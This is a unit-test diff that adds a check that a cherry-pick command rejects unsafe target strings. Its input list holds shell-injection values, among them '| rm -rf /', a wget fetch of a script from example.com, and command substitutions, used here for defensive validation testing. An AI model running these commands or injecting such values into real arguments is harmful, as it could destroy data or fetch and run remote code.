@@ -120,5 +120,34 @@ class TestCherryPickCommand(unittest.TestCase):
         ).stdout
         self.assertIn("UU file1.txt", git_status)
 
+    @patch('sys.stderr')
+    def test_cherry_pick_unsafe_input(self, mock_stderr):
+        """Test that the command rejects unsafe input strings."""
+        unsafe_inputs = [
+            "; ls -la",
+            "| rm -rf /",
+            "&& wget http://example.com/bad.sh",
+            "$(uname -a)",
+            "`uname -a`",
+            "-o SomeOption",
+            " HEAD",
+            "HEAD\n",
+        ]
+
+        for unsafe_input in unsafe_inputs:
+            with self.subTest(input=unsafe_input):
+                args = MagicMock()
+                args.project_dir = self.test_dir
+                args.target = unsafe_input
+
+                with self.assertRaises(SystemExit) as cm:
+                    run_cherry_pick(args)
+
+                self.assertEqual(cm.exception.code, 1)
+                stderr_output = "".join(call.args[0] for call in mock_stderr.write.call_args_list)
+                self.assertIn("Error: Invalid target", stderr_output)
+                # Reset mock for the next subtest
+                mock_stderr.write.reset_mock()
+
 if __name__ == '__main__':
     unittest.main()
